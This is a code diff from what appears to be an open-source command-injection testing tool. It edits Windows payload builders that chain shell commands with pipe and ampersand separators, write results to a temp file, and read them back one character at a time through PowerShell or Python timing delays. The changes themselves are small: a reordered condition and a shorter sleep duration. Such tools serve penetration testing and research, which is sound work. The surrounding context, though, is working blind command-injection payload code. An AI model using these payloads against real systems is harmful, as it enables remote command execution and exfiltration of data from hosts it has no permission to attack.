@@ -27,7 +27,7 @@ Tempfile-based decision payload (check if host is vulnerable).
 """
 def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
@@ -111,7 +111,7 @@ __Warning__: The alternative shells are still experimental.
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + "'" + TAG + "'" + pipe +
@@ -195,7 +195,7 @@ Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -306,7 +306,7 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -393,7 +393,7 @@ Get the execution output, of shell execution.
 """
 def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
@@ -469,7 +469,7 @@ __Warning__: The alternative shells are still experimental.
 def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(ord(file.read().strip()[" + str(num_of_chars - 1) + "][0])); exit(0)\""
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -542,13 +542,13 @@ Get the execution output, of shell execution.
 """
 def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
-                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec) + "\""
+                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\""
                 )
 
     elif separator == "&&" :
@@ -557,8 +557,8 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_meth
       payload = (ampersand + 
                 "for /f \"tokens=*\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
-                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE +
-                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec) + "\""
+                "do if %i==" + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\""
                 )
 
   else:  
@@ -611,7 +611,7 @@ __Warning__: The alternative shells are still experimental.
 def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):
   if settings.TARGET_OS == "win":
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "]); exit(0)\""
-    if separator == "||" or separator == "|" :
+    if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
